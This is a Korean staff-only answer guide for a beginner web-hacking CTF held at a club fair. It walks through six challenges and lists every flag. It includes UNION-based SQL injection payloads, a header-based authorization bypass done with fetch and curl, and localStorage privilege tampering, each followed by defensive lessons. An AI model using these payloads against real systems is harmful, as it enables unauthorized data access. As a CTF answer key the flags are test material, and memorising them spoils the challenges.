# CTF 풀이 해설 — LIKELION SCH 정보보호연구실

> 동아리 박람회 웹해킹 CTF 전 문제 풀이 가이드
> 운영자/스태프 전용 — 참가자에게 공개 금지

---

## 목차

- [모드 안내](#모드-안내)
- [비전공자 모드](#비전공자-모드)
  - [문제 1 — 보이지 않는 잉크 (View Source)](#비전공자-문제-1--보이지-않는-잉크-view-source)
  - [문제 2 — 브라우저의 기억 (Client Storage)](#비전공자-문제-2--브라우저의-기억-client-storage)
  - [문제 3 — 개발자 도구의 마법 (JS Console)](#비전공자-문제-3--개발자-도구의-마법-js-console)
- [전공자 모드 (타임어택)](#전공자-모드-타임어택)
  - [문제 1 — 인코딩된 비밀 (JS Obfuscation)](#전공자-문제-1--인코딩된-비밀-js-obfuscation)
  - [문제 2 — 헤더를 보내라 (HTTP Headers)](#전공자-문제-2--헤더를-보내라-http-headers)
  - [문제 3 — UNION 탈출 (Advanced SQLi)](#전공자-문제-3--union-탈출-advanced-sqli)
- [플래그 요약표](#플래그-요약표)

---

## 모드 안내

| 모드 | 대상 | 활성화 방법 |
|------|------|-------------|
| 비전공자 (일반) | 보안 지식 없는 참가자 | 기본값 |
| 전공자 (타임어택) | CS/보안 전공 참가자 | 메인 페이지에서 타임어택 모드 선택 또는 localStorage에 `ctf_mode=speedrun` 설정 |

---

## 비전공자 모드

### 비전공자 문제 1 — 보이지 않는 잉크 (View Source)

**난이도:** ★☆☆
**카테고리:** View Source
**플래그:** `FLAG{html_c0mm3nts_4r3_v1s1bl3}`

#### 시나리오
"암호동아리 Hedgehog 비밀 문서" 페이지가 보인다. 화면에는 "DOCUMENT STATUS: PUBLIC / 검열 완료 — 비밀 없음"이라고 표시되어 있지만, 소스 코드 어딘가에 비밀이 숨겨져 있다.

#### 취약점 원리
개발자가 HTML 주석(`<!-- ... -->`) 안에 민감한 정보를 남겨두고 배포했다. HTML 주석은 화면에 렌더링되지 않지만, 소스 코드를 보면 그대로 노출된다.

#### 풀이 단계

**방법 A — 페이지 소스 보기**
1. 브라우저에서 `Ctrl+U` (Windows/Linux) 또는 `Cmd+Option+U` (Mac) 입력
2. 열린 소스 코드 페이지에서 `Ctrl+F`로 `FLAG` 또는 `<!--` 검색
3. 아래 주석을 발견:
   ```html
   <!-- 개발자 메모: 플래그는 FLAG{html_c0mm3nts_4r3_v1s1bl3} 입니다. 배포 전 삭제할 것! -->
   ```

**방법 B — 개발자 도구 Elements**
1. `F12` → Elements 탭 이동
2. `Ctrl+F`로 `FLAG` 검색
3. 주석 노드에서 플래그 확인

#### 핵심 교훈
- HTML 주석은 사용자 화면에 안 보이지만 소스에는 그대로 남는다
- 서버에서 전송된 HTML은 누구나 볼 수 있으므로 민감한 정보를 주석에 남기면 안 된다

---

### 비전공자 문제 2 — 브라우저의 기억 (Client Storage)

**난이도:** ★★☆
**카테고리:** Client Storage
**플래그:** `FLAG{l0c4l_st0r4g3_1snt_s3cr3t}`

#### 시나리오
"내부 관리 대시보드"에 이미 guest로 로그인된 상태다. "관리자 전용 플래그 확인" 버튼이 있지만 클릭하면 "권한이 없습니다"라고 나온다.

#### 취약점 원리
이 사이트는 서버가 아닌 브라우저의 `localStorage`에 저장된 `isAdmin` 값으로 권한을 판단한다. localStorage는 사용자가 직접 수정할 수 있으므로 보안 기준으로 사용하면 안 된다.

#### 풀이 단계

**방법 A — 개발자 도구 Application 탭**
1. `F12` → `Application` 탭 (Chrome) 또는 `저장소` 탭 (Firefox)
2. 좌측 메뉴에서 `Local Storage` → 현재 사이트 선택
3. `isAdmin` 키를 찾아 더블클릭
4. 값을 `false` → `true`로 수정
5. 페이지로 돌아가 "관리자 전용 플래그 확인" 버튼 클릭

**방법 B — Console에서 직접 수정**
1. `F12` → `Console` 탭
2. 아래 명령어 입력 후 Enter:
   ```javascript
   localStorage.setItem("isAdmin", "true")
   ```
3. 버튼 클릭

#### 핵심 교훈
- 클라이언트 사이드(브라우저)에 저장된 값은 사용자가 자유롭게 수정 가능하다
- 권한 검증은 반드시 서버에서 이루어져야 한다

---

### 비전공자 문제 3 — 개발자 도구의 마법 (JS Console)

**난이도:** ★★★
**카테고리:** JS Console
**플래그:** `FLAG{c0ns0l3_1s_y0ur_fr13nd}`

#### 시나리오
"관리자 포털" 페이지가 잠겨 있다. 화면 하단에 "⚠️ 개발자 주석: 출시 전에 debug 함수 제거할 것!"이라는 메시지가 보인다.

#### 취약점 원리
개발자가 테스트용으로 만든 `getFlag()` 함수를 배포 전에 제거하지 않았다. 이 함수는 `window` 객체(전역)에 등록되어 있어 콘솔에서 누구나 호출할 수 있다.

#### 풀이 단계

1. `F12` → `Console` 탭 이동
2. 콘솔에 이미 힌트가 출력되어 있음:
   ```
   [SYSTEM] 디버그 모드 활성화됨. debug() 로 정보 확인 가능.
   ```
3. 먼저 `debug()` 입력해서 추가 힌트 확인 (선택):
   ```javascript
   debug()
   // → "[DEBUG] getFlag() 함수를 호출하면 관리자 토큰을 얻을 수 있습니다."
   ```
4. `getFlag()` 입력 후 Enter:
   ```javascript
   getFlag()
   // → "FLAG{c0ns0l3_1s_y0ur_fr13nd}"
   ```
5. 페이지에 플래그가 화면에 표시되고 콘솔에도 반환됨

#### 핵심 교훈
- JavaScript 코드는 브라우저에서 누구나 실행할 수 있다
- 디버그용 함수, 비밀키, 하드코딩된 플래그는 배포 전 반드시 제거해야 한다

---

## 전공자 모드 (타임어택)

### 전공자 문제 1 — 인코딩된 비밀 (JS Obfuscation)

**난이도:** ★★☆
**카테고리:** JS Obfuscation / Base64
**플래그:** `FLAG{b4s364_1s_n0t_3ncrypt10n}`

#### 시나리오
"난독화된 비밀 금고" 페이지에 minified JavaScript 코드 일부가 보인다:
```javascript
var _s = "RkxBR3...";
function _v(x){ return atob(x) }
```

#### 취약점 원리
개발자가 Base64 인코딩을 "암호화"로 착각하고 전역 변수 `window._s`에 인코딩된 플래그를 저장해뒀다. Base64는 인코딩(변환)이지 암호화가 아니므로 누구나 디코딩 가능하다.

#### 풀이 단계

**방법 A — Console에서 디코딩**
1. `F12` → `Console` 탭
2. 전역 변수 `window._s` 확인:
   ```javascript
   window._s
   // → "RkxBR3tiNHMzNjRfMXNfbjB0XzNuY3J5cHQxMG59"
   ```
3. `atob()`으로 디코딩:
   ```javascript
   atob(window._s)
   // → "FLAG{b4s364_1s_n0t_3ncrypt10n}"
   ```

**방법 B — 콘솔 출력 메시지 활용**
1. `F12` → `Console` 탭
2. 이미 출력된 경고 메시지 확인:
   ```
   [DEBUG] 개발 테스트용 변수가 남아있습니다.
   > window._s 에 민감한 값이 저장되어 있습니다.
   ```
3. 위 방법 A와 동일하게 디코딩

#### 핵심 교훈
- Base64는 암호화가 아니다 — 누구나 즉시 디코딩 가능
- 클라이언트 코드에 민감한 값을 하드코딩하면 난독화해도 소용없다
- 진짜 비밀은 서버에만 보관해야 한다

---

### 전공자 문제 2 — 헤더를 보내라 (HTTP Headers)

**난이도:** ★★☆
**카테고리:** HTTP Headers
**플래그:** `FLAG{cust0m_h34d3rs_byp4ss_4ccess}`

#### 시나리오
"API 접근 제어 우회" 페이지에서 "GET /api/speedrun/challenge2/flag" 버튼을 누르면 `HTTP 403 Forbidden` 응답과 함께 "접근 거부: 유효한 X-Admin-Secret 헤더가 필요합니다."가 나온다. 서버 의사 코드도 일부 보인다:
```
if req.headers['x-admin-secret'] === '???'
then return flag
```

#### 취약점 원리
API 서버가 커스텀 HTTP 헤더(`X-Admin-Secret`)로 인증을 구현했다. 헤더 값만 알면 누구나 직접 API를 호출해 플래그를 얻을 수 있다. 힌트: "동아리 이름"이 비밀 값이다.

#### 풀이 단계

**방법 A — Console에서 fetch 직접 호출**
1. `F12` → `Console` 탭
2. 동아리 이름 `hedgehog`를 헤더 값으로 사용:
   ```javascript
   fetch('/api/speedrun/challenge2/flag', {
     headers: { 'X-Admin-Secret': 'hedgehog' }
   }).then(r => r.json()).then(console.log)
   // → { flag: "FLAG{cust0m_h34d3rs_byp4ss_4ccess}" }
   ```

**방법 B — curl 사용**
```bash
curl -H "X-Admin-Secret: hedgehog" https://<배포URL>/api/speedrun/challenge2/flag
```

**방법 C — Burp Suite / 브라우저 Network 탭 재전송**
1. `F12` → `Network` 탭
2. 버튼 클릭해 요청 캡처
3. 요청 우클릭 → "Edit and Resend" (Firefox) 또는 Burp Suite에서 헤더 추가 후 재전송

#### 핵심 교훈
- HTTP 헤더는 클라이언트에서 임의로 설정 가능하다
- 보안 민감 값(API 키, 비밀 헤더)은 소스코드나 에러 메시지에 노출되면 안 된다
- 헤더 기반 인증은 반드시 서버 측 검증 + 비밀 값의 안전한 관리를 병행해야 한다

---

### 전공자 문제 3 — UNION 탈출 (Advanced SQLi)

**난이도:** ★★★
**카테고리:** Advanced SQL Injection (UNION-based)
**플래그:** `FLAG{un10n_s3l3ct_pwn3d}`

#### 시나리오
"사용자 검색 (내부 DB 검색 시스템)" 페이지에 username 검색창이 있다. 실행 중인 SQL 쿼리가 화면에 표시된다:
```sql
SELECT id, name FROM users WHERE
    username='[입력값]' AND password='password'
```
테이블 정보: `users(id, name, password)`, `secrets(flag)`

#### 취약점 원리
입력값이 SQL 쿼리에 직접 삽입(Parameterized Query 미사용)되어 UNION SELECT로 원래 쿼리에 없던 `secrets` 테이블을 조회할 수 있다.

#### 풀이 단계

**쿼리 분석**
```sql
-- 원본 쿼리 (2개 컬럼 반환: id, name)
SELECT id, name FROM users WHERE username='[입력]' AND password='password'

-- 공격 목표: secrets 테이블의 flag 컬럼 조회
-- 컬럼 수를 맞춰야 함 (2개)
```

**페이로드 입력** (username 필드에 입력):
```sql
' UNION SELECT flag, 1 FROM secrets--
```

**쿼리 변형 결과:**
```sql
SELECT id, name FROM users WHERE username='' UNION SELECT flag, 1 FROM secrets--' AND password='password'
```

- `'` : 원래 문자열 닫기
- `UNION SELECT flag, 1 FROM secrets` : secrets 테이블에서 flag 조회 (컬럼 수 2개 맞춤)
- `--` : 이후 쿼리 주석 처리

**결과:** `UNION SELECT 성공 — secrets 테이블 조회됨` 메시지와 함께 플래그 반환

#### 대소문자/공백 변형 (모두 허용)
```sql
' union select flag, 1 from secrets--
' UNION SELECT flag,1 FROM secrets #
' union select flag, 1 from secret--
```

#### 핵심 교훈
- SQL Injection은 입력값을 쿼리에 직접 삽입할 때 발생한다
- **Parameterized Query(준비된 쿼리)** 또는 **ORM** 사용으로 완전 방지 가능하다
- UNION 기반 SQLi는 원본 쿼리와 컬럼 수·타입을 맞춰야 동작한다
- 오류 메시지, 테이블명 노출은 공격자에게 큰 도움이 된다

---

## 플래그 요약표

| 모드 | 문제 | 제목 | 카테고리 | 플래그 |
|------|------|------|----------|--------|
| 비전공자 | 1 | 보이지 않는 잉크 | View Source | `FLAG{html_c0mm3nts_4r3_v1s1bl3}` |
| 비전공자 | 2 | 브라우저의 기억 | Client Storage | `FLAG{l0c4l_st0r4g3_1snt_s3cr3t}` |
| 비전공자 | 3 | 개발자 도구의 마법 | JS Console | `FLAG{c0ns0l3_1s_y0ur_fr13nd}` |
| 전공자 | 1 | 인코딩된 비밀 | JS Obfuscation | `FLAG{b4s364_1s_n0t_3ncrypt10n}` |
| 전공자 | 2 | 헤더를 보내라 | HTTP Headers | `FLAG{cust0m_h34d3rs_byp4ss_4ccess}` |
| 전공자 | 3 | UNION 탈출 | Advanced SQLi | `FLAG{un10n_s3l3ct_pwn3d}` |
